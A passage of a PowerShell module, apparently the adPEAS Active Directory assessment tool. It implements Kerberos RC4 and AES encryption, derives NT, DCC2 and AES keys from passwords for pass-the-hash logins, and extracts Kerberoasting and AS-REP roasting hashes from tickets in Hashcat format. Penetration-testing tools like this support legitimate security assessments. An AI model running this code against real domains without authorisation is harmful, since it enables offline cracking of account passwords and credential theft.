    $K2 = Get-HMACMD5 -Key $K1 -Data $checksum

    # Decrypted = RC4(K2, encrypted)
    $decrypted = Invoke-RC4 -Key $K2 -Data $encrypted

    # Verify checksum using constant-time comparison (prevents timing attacks)
    $expectedChecksum = Get-HMACMD5 -Key $K1 -Data $decrypted
    if (-not (Compare-ByteArrayConstantTime -Array1 $checksum -Array2 $expectedChecksum)) {
        # Debug: Show checksum comparison for diagnostics
        $receivedHex = ($checksum | ForEach-Object { $_.ToString('X2') }) -join ''
        $expectedHex = ($expectedChecksum | ForEach-Object { $_.ToString('X2') }) -join ''
        Write-Debug "[Decrypt-RC4HMAC] Checksum mismatch - Received: $receivedHex, Expected: $expectedHex"
        throw "RC4-HMAC checksum verification failed"
    }

    # Return plaintext without confounder
    return $decrypted[$Script:RC4_CONFOUNDER_SIZE..($decrypted.Length - 1)]
}

function Invoke-NFold {
    <#
    .SYNOPSIS
        n-fold implementation per RFC 3961.
    .DESCRIPTION
        Direct port from MIT Kerberos (krb5/src/lib/crypto/krb/nfold.c).
        Used for AES key derivation.
    .PARAMETER InputData
        The input bytes.
    .PARAMETER OutputBits
        The desired output size in bits.
    .OUTPUTS
        [byte[]] n-folded output.
    #>
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$InputData,

        [Parameter(Mandatory = $true)]
        [int]$OutputBits
    )

    # Use [long] to prevent integer overflow with large inputs
    [long]$inbits = $InputData.Length
    [long]$outbits = $OutputBits / 8

    # Calculate GCD using Euclidean algorithm
    [long]$a = $outbits
    [long]$b = $inbits
    while ($b -ne 0) {
        $c = $b
        $b = $a % $b
        $a = $c
    }

    # Calculate LCM (use [long] to prevent overflow)
    [long]$lcm = ([long]$outbits * [long]$inbits) / $a

    # Initialize output
    $out = New-Object byte[] $outbits
    $byte = 0

    # Main loop
    for ($i = $lcm - 1; $i -ge 0; $i--) {
        $inbits_bits = $inbits * 8
        $msbit = ((($inbits_bits - 1) +
                   (($inbits_bits + 13) * [int][Math]::Floor($i / $inbits)) +
                   (($inbits - ($i % $inbits)) * 8)) % $inbits_bits)

        $msbit_byte = [int][Math]::Floor($msbit / 8)
        $msbit_bit = $msbit -band 7

        $idx1 = (($inbits - 1 - $msbit_byte) % $inbits + $inbits) % $inbits
        $idx2 = (($inbits - $msbit_byte) % $inbits + $inbits) % $inbits

        $combined = ([int]$InputData[$idx1] -shl 8) -bor [int]$InputData[$idx2]
        $shifted = ($combined -shr ($msbit_bit + 1)) -band 0xFF

        $byte = $byte + $shifted

        $outIdx = $i % $outbits
        $byte = $byte + [int]$out[$outIdx]
        $out[$outIdx] = [byte]($byte -band 0xFF)
        $byte = $byte -shr 8
    }

    # Final carry propagation
    if ($byte -gt 0) {
        for ($i = $outbits - 1; $i -ge 0; $i--) {
            $byte = $byte + [int]$out[$i]
            $out[$i] = [byte]($byte -band 0xFF)
            $byte = $byte -shr 8
        }
    }

    return $out
}

function Get-AESDerivedKey {
    <#
    .SYNOPSIS
        Derives AES key using DK function (RFC 3961).
    .PARAMETER BaseKey
        The base key.
    .PARAMETER Constant
        The constant for key derivation.
    .PARAMETER KeyLength
        The desired key length (16 or 32).
    .OUTPUTS
        [byte[]] Derived key.
    #>
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$BaseKey,

        [Parameter(Mandatory = $true)]
        [byte[]]$Constant,

        [Parameter(Mandatory = $true)]
        [int]$KeyLength
    )

    # Validate key lengths (RFC 3962)
    if ($BaseKey.Length -notin @($Script:AES128_KEY_SIZE, $Script:AES256_KEY_SIZE)) {
        throw "BaseKey must be $Script:AES128_KEY_SIZE (AES-128) or $Script:AES256_KEY_SIZE (AES-256) bytes, got $($BaseKey.Length)"
    }
    if ($KeyLength -notin @($Script:AES128_KEY_SIZE, $Script:AES256_KEY_SIZE)) {
        throw "KeyLength must be $Script:AES128_KEY_SIZE (AES-128) or $Script:AES256_KEY_SIZE (AES-256), got $KeyLength"
    }

    $aes = [System.Security.Cryptography.Aes]::Create()
    try {
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
        $aes.Key = $BaseKey
        $aes.IV = New-Object byte[] $Script:AES_BLOCK_SIZE

        $encryptor = $aes.CreateEncryptor()
        try {
            $blockSize = $Script:AES_BLOCK_SIZE
            $nfoldedConstant = Invoke-NFold -InputData $Constant -OutputBits ($blockSize * 8)

            $derivedKey = @()
            $currentBlock = $nfoldedConstant

            while ($derivedKey.Length -lt $KeyLength) {
                $currentBlock = $encryptor.TransformFinalBlock($currentBlock, 0, $currentBlock.Length)
                $derivedKey += $currentBlock
            }

            return $derivedKey[0..($KeyLength - 1)]
        }
        finally {
            $encryptor.Dispose()
        }
    }
    finally {
        $aes.Dispose()
    }
}

function Get-AESKeyFromPassword {
    <#
    .SYNOPSIS
        Derives AES key from password per RFC 3962.
    .DESCRIPTION
        Key = DK(PBKDF2(password, salt, 4096, keyLength), "kerberos")
        Salt = uppercase(realm) + username
    .PARAMETER PlainPassword
        The plaintext password.
    .PARAMETER Salt
        The salt (uppercase realm + username).
    .PARAMETER KeyLength
        The key length (16 for AES128, 32 for AES256).
    .OUTPUTS
        [byte[]] Derived AES key.
    #>
    param(
        [Parameter(Mandatory = $true)]
        [AllowEmptyString()]
        [string]$PlainPassword,

        [Parameter(Mandatory = $true)]
        [string]$Salt,

        [Parameter(Mandatory = $true)]
        [int]$KeyLength
    )

    $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainPassword)
    $saltBytes = [System.Text.Encoding]::UTF8.GetBytes($Salt)

    $pbkdf2 = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
        $passwordBytes,
        $saltBytes,
        4096,
        [System.Security.Cryptography.HashAlgorithmName]::SHA1
    )
    try {
        $tempKey = $pbkdf2.GetBytes($KeyLength)
    }
    finally {
        $pbkdf2.Dispose()
    }

    # Apply DK function: DK(tempKey, "kerberos")
    $constant = [System.Text.Encoding]::ASCII.GetBytes("kerberos")
    $finalKey = Get-AESDerivedKey -BaseKey $tempKey -Constant $constant -KeyLength $KeyLength

    return $finalKey
}

function Get-Hash {
    <#
    .SYNOPSIS
        Derives common password hashes and Kerberos keys from a plaintext password.
    .DESCRIPTION
        Computes multiple hash formats from a password, returned as hex strings for easy copy/paste.

        Always computed:
        - RC4 (NT-Hash): MD4(UTF-16LE(password)) - no salt, domain-independent
        - MD5, SHA1, SHA256, SHA512: Standard cryptographic hashes

        Computed when -UserName is provided:
        - DCC (mscache v1): MD4(NT-Hash || UTF-16LE(lowercase(username)))
        - DCC2 (mscachev2): PBKDF2-HMAC-SHA1(DCC, lowercase(username), 10240, 16)

        Computed when -Domain and -UserName are provided:
        - AES128/AES256: PBKDF2-SHA1 + DK("kerberos") per RFC 3962
    .PARAMETER Password
        The plaintext password.
    .PARAMETER Domain
        The domain FQDN (e.g., "contoso.com"). Will be uppercased for the AES salt.
        Required for AES key derivation.
    .PARAMETER UserName
        The sAMAccountName (e.g., "admin"). Case-sensitive for the AES salt.
        Required for AES and DCC/DCC2 key derivation.
    .OUTPUTS
        [PSCustomObject] with hash values as hex strings. Properties depend on provided parameters.
    .EXAMPLE
        Get-Hash -Password "P@ssw0rd"
    .EXAMPLE
        Get-Hash -Password "P@ssw0rd" -Domain "contoso.com" -UserName "admin"
    .EXAMPLE
        # Use output with Connect-adPEAS
        $h = Get-Hash -Password "P@ssw0rd" -Domain "contoso.com" -UserName "admin"
        Connect-adPEAS -Domain "contoso.com" -Username "admin" -NTHash $h.RC4
        Connect-adPEAS -Domain "contoso.com" -Username "admin" -AES256Key $h.AES256
    #>
    param(
        [Parameter(Mandatory = $true)]
        [string]$Password,

        [Parameter(Mandatory = $false)]
        [string]$Domain,

        [Parameter(Mandatory = $false)]
        [string]$UserName
    )

    $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($Password)

    # --- Always computed (no salt required) ---

    # RC4 key (NT-Hash): MD4(UTF-16LE(password))
    $ntHashBytes = Get-NTHashFromPassword -PlainPassword $Password
    $rc4Hex = ($ntHashBytes | ForEach-Object { $_.ToString("X2") }) -join ''

    # MD5
    $md5 = [System.Security.Cryptography.MD5]::Create()
    try { $md5Hex = ($md5.ComputeHash($passwordBytes) | ForEach-Object { $_.ToString("X2") }) -join '' }
    finally { $md5.Dispose() }

    # SHA1
    $sha1 = [System.Security.Cryptography.SHA1]::Create()
    try { $sha1Hex = ($sha1.ComputeHash($passwordBytes) | ForEach-Object { $_.ToString("X2") }) -join '' }
    finally { $sha1.Dispose() }

    # SHA256
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    try { $sha256Hex = ($sha256.ComputeHash($passwordBytes) | ForEach-Object { $_.ToString("X2") }) -join '' }
    finally { $sha256.Dispose() }

    # SHA512
    $sha512 = [System.Security.Cryptography.SHA512]::Create()
    try { $sha512Hex = ($sha512.ComputeHash($passwordBytes) | ForEach-Object { $_.ToString("X2") }) -join '' }
    finally { $sha512.Dispose() }

    # --- Requires UserName (salt) ---

    $dccHex  = $null
    $dcc2Hex = $null

    if ($UserName) {
        # DCC (Domain Cached Credentials v1): MD4(NT-Hash || UTF-16LE(lowercase(username)))
        # Also known as "mscache" - stored locally when DC is unreachable
        $userLower = [System.Text.Encoding]::Unicode.GetBytes($UserName.ToLower())
        $dccInput = New-Object byte[] ($ntHashBytes.Length + $userLower.Length)
        [Array]::Copy($ntHashBytes, 0, $dccInput, 0, $ntHashBytes.Length)
        [Array]::Copy($userLower, 0, $dccInput, $ntHashBytes.Length, $userLower.Length)
        $dccBytes = Get-MD4Hash -Data $dccInput
        $dccHex = ($dccBytes | ForEach-Object { $_.ToString("X2") }) -join ''

        # DCC2 (Domain Cached Credentials v2): PBKDF2-HMAC-SHA1(DCC, lowercase(username), 10240, 16)
        # Also known as "mscachev2" - used since Vista/2008
        # Manual PBKDF2 because Rfc2898DeriveBytes requires minimum 8-byte salt
        $dcc2Salt = [System.Text.Encoding]::UTF8.GetBytes($UserName.ToLower())
        $dcc2Iterations = 10240
        $dcc2Len = 16

        # PBKDF2-HMAC-SHA1 (RFC 2898 Section 5.2) - single block (dkLen <= 20)
        $saltBlock = New-Object byte[] ($dcc2Salt.Length + 4)
        [Array]::Copy($dcc2Salt, 0, $saltBlock, 0, $dcc2Salt.Length)
        $saltBlock[$saltBlock.Length - 1] = 1  # Block index 1 (big-endian)

        $uBlock = Get-HMACSHA1 -Key $dccBytes -Data $saltBlock
        $xorAccum = $uBlock.Clone()

        for ($iter = 1; $iter -lt $dcc2Iterations; $iter++) {
            $uBlock = Get-HMACSHA1 -Key $dccBytes -Data $uBlock
            for ($j = 0; $j -lt $xorAccum.Length; $j++) {
                $xorAccum[$j] = $xorAccum[$j] -bxor $uBlock[$j]
            }
        }

        $dcc2Bytes = $xorAccum[0..($dcc2Len - 1)]
        $dcc2Hex = ($dcc2Bytes | ForEach-Object { $_.ToString("X2") }) -join ''
    }

    # --- Requires Domain + UserName (Kerberos salt) ---

    $aes128Hex = $null
    $aes256Hex = $null

    if ($Domain -and $UserName) {
        $salt = $Domain.ToUpper() + $UserName

        $aes128Bytes = Get-AESKeyFromPassword -PlainPassword $Password -Salt $salt -KeyLength $Script:AES128_KEY_SIZE
        $aes128Hex = ($aes128Bytes | ForEach-Object { $_.ToString("X2") }) -join ''

        $aes256Bytes = Get-AESKeyFromPassword -PlainPassword $Password -Salt $salt -KeyLength $Script:AES256_KEY_SIZE
        $aes256Hex = ($aes256Bytes | ForEach-Object { $_.ToString("X2") }) -join ''
    }

    # Build result object
    $resultObj = [ordered]@{
        UserName = if ($UserName) { $UserName } else { $null }
        Domain   = if ($Domain) { $Domain.ToUpper() } else { $null }
        Password = $Password
        RC4      = $rc4Hex
        AES128   = $aes128Hex
        AES256   = $aes256Hex
        DCC      = $dccHex
        DCC2     = $dcc2Hex
        MD5      = $md5Hex
        SHA1     = $sha1Hex
        SHA256   = $sha256Hex
        SHA512   = $sha512Hex
    }

    return [PSCustomObject]$resultObj
}

function Invoke-AESCBC-CTS {
    <#
    .SYNOPSIS
        AES-CBC-CTS encryption/decryption per RFC 3962.
    .DESCRIPTION
        Implements Ciphertext Stealing (CTS) mode for AES.
        Used by Kerberos AES128 (etype 17) and AES256 (etype 18).
    .PARAMETER Key
        The AES key.
    .PARAMETER Data
        The data to encrypt/decrypt.
    .PARAMETER Encrypt
        $true for encryption, $false for decryption.
    .OUTPUTS
        [byte[]] Encrypted or decrypted data.
    #>
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Key,

        [Parameter(Mandatory = $true)]
        [byte[]]$Data,

        [Parameter(Mandatory = $true)]
        [bool]$Encrypt
    )

    $blockSize = $Script:AES_BLOCK_SIZE

    # Pad to multiple of block size with zeros
    $padLen = ($blockSize - ($Data.Length % $blockSize)) % $blockSize
    $padded = $Data + (New-Object byte[] $padLen)

    $aes = [System.Security.Cryptography.Aes]::Create()
    try {
        $aes.Key = $Key
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
        $aes.IV = New-Object byte[] $blockSize

        if ($Encrypt) {
            $encryptor = $aes.CreateEncryptor()
            try {
                $ctext = $encryptor.TransformFinalBlock($padded, 0, $padded.Length)
            }
            finally {
                $encryptor.Dispose()
            }

            if ($Data.Length -gt $blockSize) {
                # Swap the last two ciphertext blocks and truncate
                $lastLen = $Data.Length % $blockSize
                if ($lastLen -eq 0) { $lastLen = $blockSize }

                $beforeLastTwo = $ctext.Length - 32
                $resultLen = $beforeLastTwo + $blockSize + $lastLen
                $result = New-Object byte[] $resultLen

                if ($beforeLastTwo -gt 0) {
                    [Array]::Copy($ctext, 0, $result, 0, $beforeLastTwo)
                }

                # Swap: put last block in second-to-last position
                [Array]::Copy($ctext, $ctext.Length - $blockSize, $result, $beforeLastTwo, $blockSize)

                # Put second-to-last block (truncated) in last position
                [Array]::Copy($ctext, $ctext.Length - 2 * $blockSize, $result, $beforeLastTwo + $blockSize, $lastLen)

                return $result
            }
            else {
                # Single block - return truncated to original length
                return $ctext[0..($Data.Length - 1)]
            }
        }
        else {
            # DECRYPTION
            if ($Data.Length -le $blockSize) {
                $decryptor = $aes.CreateDecryptor()
                try {
                    $ptext = $decryptor.TransformFinalBlock($padded, 0, $padded.Length)
                }
                finally {
                    $decryptor.Dispose()
                }
                return $ptext[0..($Data.Length - 1)]
            }

            # Multiple blocks with CTS
            $lastLen = $Data.Length % $blockSize
            if ($lastLen -eq 0) { $lastLen = $blockSize }

            $Cn = $Data[($Data.Length - $blockSize - $lastLen)..($Data.Length - $lastLen - 1)]
            $CnMinus1Partial = $Data[($Data.Length - $lastLen)..($Data.Length - 1)]

            # Decrypt Cn with ECB
            $aes.Mode = [System.Security.Cryptography.CipherMode]::ECB
            $decryptorEcb = $aes.CreateDecryptor()
            try {
                $intermediate = $decryptorEcb.TransformFinalBlock($Cn, 0, $blockSize)
            }
            finally {
                $decryptorEcb.Dispose()
            }

            # Pad Cn-1 with stolen bytes
            $CnMinus1Full = New-Object byte[] $blockSize
            [Array]::Copy($CnMinus1Partial, 0, $CnMinus1Full, 0, $lastLen)
            for ($i = $lastLen; $i -lt $blockSize; $i++) {
                $CnMinus1Full[$i] = $intermediate[$i]
            }

            # XOR to get Pn
            $Pn = New-Object byte[] $lastLen
            for ($i = 0; $i -lt $lastLen; $i++) {
                $Pn[$i] = $intermediate[$i] -bxor $CnMinus1Partial[$i]
            }

            # IV for Cn-1
            if ($Data.Length -gt 2 * $blockSize) {
                $ivForCnMinus1 = $Data[($Data.Length - $blockSize - $lastLen - $blockSize)..($Data.Length - $blockSize - $lastLen - 1)]
            }
            else {
                $ivForCnMinus1 = New-Object byte[] $blockSize
            }

            # Decrypt Cn-1
            $decryptorEcb2 = $aes.CreateDecryptor()
            try {
                $PnMinus1Intermediate = $decryptorEcb2.TransformFinalBlock($CnMinus1Full, 0, $blockSize)
            }
            finally {
                $decryptorEcb2.Dispose()
            }

            $PnMinus1 = New-Object byte[] $blockSize
            for ($i = 0; $i -lt $blockSize; $i++) {
                $PnMinus1[$i] = $PnMinus1Intermediate[$i] -bxor $ivForCnMinus1[$i]
            }

            # Decrypt remaining blocks with CBC
            $result = New-Object byte[] $Data.Length

            if ($Data.Length -gt 2 * $blockSize) {
                $beforeLastTwoLen = $Data.Length - $blockSize - $lastLen
                $beforeLastTwo = $Data[0..($beforeLastTwoLen - 1)]

                $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                $aes.IV = New-Object byte[] $blockSize
                $decryptorCbc = $aes.CreateDecryptor()
                try {
                    $plainBefore = $decryptorCbc.TransformFinalBlock($beforeLastTwo, 0, $beforeLastTwo.Length)
                }
                finally {
                    $decryptorCbc.Dispose()
                }

                [Array]::Copy($plainBefore, 0, $result, 0, $beforeLastTwoLen)
            }

            $pnMinus1Offset = $Data.Length - $blockSize - $lastLen
            [Array]::Copy($PnMinus1, 0, $result, $pnMinus1Offset, $blockSize)
            [Array]::Copy($Pn, 0, $result, $pnMinus1Offset + $blockSize, $lastLen)

            return $result
        }
    }
    finally {
        $aes.Dispose()
    }
}

function Encrypt-AESCTS {
    <#
    .SYNOPSIS
        Encrypts data using AES-CTS with HMAC-SHA1 checksum.
    .DESCRIPTION
        Implements RFC 3962 AES encryption for Kerberos (etype 17/18).
    .PARAMETER Key
        The AES key.
    .PARAMETER Data
        The plaintext data.
    .PARAMETER KeyUsage
        The Kerberos key usage number.
    .OUTPUTS
        [byte[]] Encrypted data with checksum.
    #>
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Key,

        [Parameter(Mandatory = $true)]
        [byte[]]$Data,

        [Parameter(Mandatory = $true)]
        [int]$KeyUsage
    )

    $keyLength = $Key.Length

    # Ke = DK(base-key, usage | 0xAA) - Encryption key
    $keConstant = Get-KeyUsageConstant -KeyUsage $KeyUsage -Suffix $Script:KE_CONSTANT_SUFFIX
    $Ke = Get-AESDerivedKey -BaseKey $Key -Constant $keConstant -KeyLength $keyLength

    # Ki = DK(base-key, usage | 0x55) - Integrity key
    $kiConstant = Get-KeyUsageConstant -KeyUsage $KeyUsage -Suffix $Script:KI_CONSTANT_SUFFIX
    $Ki = Get-AESDerivedKey -BaseKey $Key -Constant $kiConstant -KeyLength $keyLength

    # Generate random confounder (RFC 3962: 16 bytes for AES-CTS)
    $confounder = New-Object byte[] $Script:AES_CONFOUNDER_SIZE
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    try {
        $rng.GetBytes($confounder)
    }
    finally {
        $rng.Dispose()
    }

    $plaintext = $confounder + $Data

    # AES-CTS handles non-block-aligned data natively (no pre-padding needed)
    # Invoke-AESCBC-CTS pads internally for CBC but uses CTS block swap for correct output size
    $encrypted = Invoke-AESCBC-CTS -Key $Ke -Data $plaintext -Encrypt $true

    # Checksum = first 12 bytes of HMAC-SHA1 over unpadded confounder + plaintext
    $hmac = Get-HMACSHA1 -Key $Ki -Data $plaintext
    $checksum = $hmac[0..($Script:AES_CHECKSUM_SIZE - 1)]

    return $encrypted + $checksum
}

function Decrypt-AESCTS {
    <#
    .SYNOPSIS
        Decrypts data using AES-CTS with HMAC-SHA1 checksum verification.
    .DESCRIPTION
        Implements RFC 3962 AES decryption for Kerberos (etype 17/18).
    .PARAMETER Key
        The AES key.
    .PARAMETER CipherText
        The encrypted data with checksum.
    .PARAMETER KeyUsage
        The Kerberos key usage number.
    .OUTPUTS
        [byte[]] Decrypted plaintext (without confounder).
    #>
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$Key,

        [Parameter(Mandatory = $true)]
        [byte[]]$CipherText,

        [Parameter(Mandatory = $true)]
        [int]$KeyUsage
    )

    $keyLength = $Key.Length
    $checksumLength = $Script:AES_CHECKSUM_SIZE

    if ($CipherText.Length -lt $Script:AES_MIN_CIPHERTEXT) {
        throw "AES-CTS ciphertext too short (minimum $Script:AES_MIN_CIPHERTEXT bytes: $Script:AES_CONFOUNDER_SIZE confounder + $Script:AES_CHECKSUM_SIZE checksum)"
    }

    $encrypted = $CipherText[0..($CipherText.Length - $checksumLength - 1)]
    $checksum = $CipherText[($CipherText.Length - $checksumLength)..($CipherText.Length - 1)]

    # Ke = DK(base-key, usage | 0xAA) - Encryption key
    $keConstant = Get-KeyUsageConstant -KeyUsage $KeyUsage -Suffix $Script:KE_CONSTANT_SUFFIX
    $Ke = Get-AESDerivedKey -BaseKey $Key -Constant $keConstant -KeyLength $keyLength

    # Ki = DK(base-key, usage | 0x55) - Integrity key
    $kiConstant = Get-KeyUsageConstant -KeyUsage $KeyUsage -Suffix $Script:KI_CONSTANT_SUFFIX
    $Ki = Get-AESDerivedKey -BaseKey $Key -Constant $kiConstant -KeyLength $keyLength

    $decrypted = Invoke-AESCBC-CTS -Key $Ke -Data $encrypted -Encrypt $false

    # Verify checksum using constant-time comparison (prevents timing attacks)
    $expectedHmac = Get-HMACSHA1 -Key $Ki -Data $decrypted
    $expectedChecksum = [byte[]]$expectedHmac[0..($Script:AES_CHECKSUM_SIZE - 1)]

    if (-not (Compare-ByteArrayConstantTime -Array1 $checksum -Array2 $expectedChecksum)) {
        throw "AES-CTS checksum verification failed"
    }

    # Return plaintext without confounder
    return $decrypted[$Script:AES_CONFOUNDER_SIZE..($decrypted.Length - 1)]
}

<#
.SYNOPSIS
    Creates a standardized Kerberos operation result object.
.DESCRIPTION
    Factory function to ensure consistent return objects across all Kerberos functions.
    This pattern allows callers to check $result.Success before accessing other properties.

    Standard Result Schema:
    - Success      : [bool]   - Whether the operation succeeded
    - Message      : [string] - Human-readable status message
    - Error        : [string] - Error details if Success is $false (null otherwise)
    - Data         : [object] - Operation-specific data (tickets, keys, etc.)

.PARAMETER Success
    Whether the operation succeeded.
.PARAMETER Message
    Human-readable status message.
.PARAMETER Error
    Error details (only for failures).
.PARAMETER Data
    Additional data as hashtable (merged into result).
.OUTPUTS
    [PSCustomObject] Standardized result object.
.EXAMPLE
    # Success case
    return New-KerberosResult -Success $true -Message "TGT obtained" -Data @{
        Ticket = $ticketBytes
        SessionKey = $sessionKey
    }

    # Failure case
    return New-KerberosResult -Success $false -Error "KRB-ERROR 24: Pre-authentication failed"
#>
function New-KerberosResult {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [bool]$Success,

        [Parameter(Mandatory = $false)]
        [string]$Message = "",

        [Parameter(Mandatory = $false)]
        [string]$Error = $null,

        [Parameter(Mandatory = $false)]
        [hashtable]$Data = @{}
    )

    $result = [PSCustomObject]@{
        Success = $Success
        Message = $Message
        Error   = $Error
    }

    # Merge additional data properties into result
    foreach ($key in $Data.Keys) {
        $result | Add-Member -NotePropertyName $key -NotePropertyValue $Data[$key] -Force
    }

    return $result
}

<#
.SYNOPSIS
    Extracts a crackable hash from a Kerberos ticket for Hashcat/John the Ripper.

.DESCRIPTION
    Central function to extract hashes from Kerberos tickets (TGS for Kerberoasting,
    AS-REP for AS-REP Roasting). Parses the ASN.1 structure to find the encrypted part and formats it for offline cracking tools.

    Supported hash formats:
    - TGS (Kerberoast): $krb5tgs$etype$*user$realm$spn*$checksum$encrypted
    - AS-REP: $krb5asrep$etype$user@realm:checksum$encrypted

    Used by: Invoke-Kerberoast, Invoke-ASREPRoast

.PARAMETER TicketBytes
    The raw ASN.1 encoded Kerberos ticket bytes.

.PARAMETER EncryptionType
    The encryption type (etype) used for the ticket:
    - 17: AES128-CTS-HMAC-SHA1-96
    - 18: AES256-CTS-HMAC-SHA1-96
    - 23: RC4-HMAC

.PARAMETER UserName
    The username associated with the ticket.

.PARAMETER Realm
    The Kerberos realm (domain) in uppercase.

.PARAMETER SPN
    The Service Principal Name (for TGS tickets).

.PARAMETER TicketType
    The type of ticket: "TGS" (Kerberoast) or "ASREP" (AS-REP Roast).
    Default: "TGS"

.OUTPUTS
    String - The formatted hash string for Hashcat/John, or $null on failure.

.EXAMPLE
    $hash = Get-KerberosTicketHash -TicketBytes $tgsBytes -EncryptionType 23 -UserName "admin" -Realm "CONTOSO.COM" -SPN "MSSQLSvc/sql.contoso.com"

.EXAMPLE
    $hash = Get-KerberosTicketHash -TicketBytes $asrepBytes -EncryptionType 23 -UserName "vulnuser" -Realm "CONTOSO.COM" -TicketType "ASREP"

.NOTES
    Hash formats:
    - RC4 (etype 23): checksum is first 16 bytes of cipher
    - AES (etype 17/18): checksum is last 12 bytes of cipher
#>
function Get-KerberosTicketHash {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [byte[]]$TicketBytes,

        [Parameter(Mandatory = $true)]
        [int]$EncryptionType,

        [Parameter(Mandatory = $true)]
        [string]$UserName,

        [Parameter(Mandatory = $true)]
        [string]$Realm,

        [Parameter(Mandatory = $false)]
        [string]$SPN = "",

        [Parameter(Mandatory = $false)]
        [ValidateSet("TGS", "ASREP")]
        [string]$TicketType = "TGS"
    )

    try {
        # Early validation - ticket must be at least MIN_TICKET_SIZE bytes
        if ($TicketBytes.Length -lt $Script:MIN_TICKET_SIZE) {
            Write-Log "[Get-KerberosTicketHash] Ticket too short: $($TicketBytes.Length) bytes (minimum $Script:MIN_TICKET_SIZE)"
            return $null
        }

        # Parse ASN.1 encoded ticket to find encrypted part
        # Looking for context tag [3] (enc-part) containing EncryptedData
        #
        # Ticket/AS-REP structure contains:
        # enc-part [3] EncryptedData {
        #     etype  [0] Int32
        #     kvno   [1] UInt32 OPTIONAL
        #     cipher [2] OCTET STRING
        # }

        $pos = 0
        $encryptedPart = $null

        # Scan for enc-part tag (0xA3 = context-specific tag 3)
        while ($pos -lt $TicketBytes.Length - 20) {
            if ($TicketBytes[$pos] -eq 0xA3) {
                # Found enc-part tag
                $pos++

                # Parse length (BER encoding)
                $length = $TicketBytes[$pos]
                if ($length -gt 0x80) {
                    $numLengthBytes = $length -band 0x7F
                    $pos += $numLengthBytes + 1
                } else {
                    $pos++
                }

                # Now at EncryptedData SEQUENCE (0x30)
                if ($TicketBytes[$pos] -eq 0x30) {
                    $pos++
                    $seqLength = $TicketBytes[$pos]
                    if ($seqLength -gt 0x80) {
                        $numLengthBytes = $seqLength -band 0x7F
                        $pos += $numLengthBytes + 1
                    } else {
                        $pos++
                    }

                    # Skip to cipher field (tag 0xA2)
                    while ($pos -lt $TicketBytes.Length -and $TicketBytes[$pos] -ne 0xA2) {
                        $pos++
                    }

                    # Found cipher field
                    if ($pos -lt $TicketBytes.Length -and $TicketBytes[$pos] -eq 0xA2) {
                        $pos++

                        # Parse cipher context length
                        $cipherContextLength = $TicketBytes[$pos]
                        if ($cipherContextLength -gt 0x80) {
                            $numLengthBytes = $cipherContextLength -band 0x7F
                            $pos++
                            $cipherContextLength = 0
                            for ($i = 0; $i -lt $numLengthBytes; $i++) {
                                $cipherContextLength = ($cipherContextLength -shl 8) -bor $TicketBytes[$pos]
                                $pos++
                            }
                        } else {
                            $pos++
                        }

                        # Now at OCTET STRING (0x04)
                        if ($TicketBytes[$pos] -eq 0x04) {
                            $pos++
                            $octetLength = $TicketBytes[$pos]
                            if ($octetLength -gt 0x80) {
                                $numLengthBytes = $octetLength -band 0x7F
                                $pos++
                                $octetLength = 0
                                for ($i = 0; $i -lt $numLengthBytes; $i++) {
                                    $octetLength = ($octetLength -shl 8) -bor $TicketBytes[$pos]
                                    $pos++
                                }
                            } else {
                                $pos++
                            }

                            # Extract cipher bytes
                            if ($pos + $octetLength -le $TicketBytes.Length) {
                                $encryptedPart = $TicketBytes[$pos..($pos + $octetLength - 1)]
                            }
                        }
                    }
                }
                break
            }
            $pos++
        }

        # Validate extracted data
        $minLength = if ($EncryptionType -eq 23) { $Script:RC4_MIN_CIPHERTEXT } else { $Script:AES_MIN_CIPHERTEXT }
        if (-not $encryptedPart -or $encryptedPart.Length -lt $minLength) {
            Write-Log "[Get-KerberosTicketHash] Failed to extract cipher from ticket (got $($encryptedPart.Length) bytes, need $minLength)"
            return $null
        }

        # Format hash based on encryption type
        # RC4 (etype 23): checksum is first 16 bytes
        # AES (etype 17/18): checksum is last 12 bytes
        $hash = $null

        if ($EncryptionType -eq 23) {
            # RC4-HMAC: checksum at beginning
            $checksum = $encryptedPart[0..($Script:HMAC_MD5_SIZE - 1)]
            $encrypted = $encryptedPart[$Script:HMAC_MD5_SIZE..($encryptedPart.Length - 1)]

            $checksumHex = ($checksum | ForEach-Object { $_.ToString("x2") }) -join ''
            $encryptedHex = ($encrypted | ForEach-Object { $_.ToString("x2") }) -join ''

            if ($TicketType -eq "TGS") {
                $hash = "`$krb5tgs`$23`$*$UserName`$$Realm`$$SPN*`$$checksumHex`$$encryptedHex"
            } else {
                $hash = "`$krb5asrep`$23`$$UserName@$Realm`:$checksumHex`$$encryptedHex"
            }
        } else {
            # AES: checksum at end (last 12 bytes)
            $encrypted = $encryptedPart[0..($encryptedPart.Length - $Script:AES_CHECKSUM_SIZE - 1)]
            $checksum = $encryptedPart[($encryptedPart.Length - $Script:AES_CHECKSUM_SIZE)..($encryptedPart.Length - 1)]

            $checksumHex = ($checksum | ForEach-Object { $_.ToString("x2") }) -join ''
            $encryptedHex = ($encrypted | ForEach-Object { $_.ToString("x2") }) -join ''

            if ($TicketType -eq "TGS") {
                $hash = "`$krb5tgs`$$EncryptionType`$*$UserName`$$Realm`$$SPN*`$$checksumHex`$$encryptedHex"
            } else {
                $hash = "`$krb5asrep`$$EncryptionType`$$UserName@$Realm`:$checksumHex`$$encryptedHex"
            }
        }

        Write-Log "[Get-KerberosTicketHash] Extracted $TicketType hash (etype $EncryptionType, cipher $($encryptedPart.Length) bytes)"
        return $hash
    }
    catch {
        Write-Log "[Get-KerberosTicketHash] Error extracting hash: $_"
        return $null
    }
}

<#
.SYNOPSIS
    Sends a Kerberos request to a KDC and receives the response.

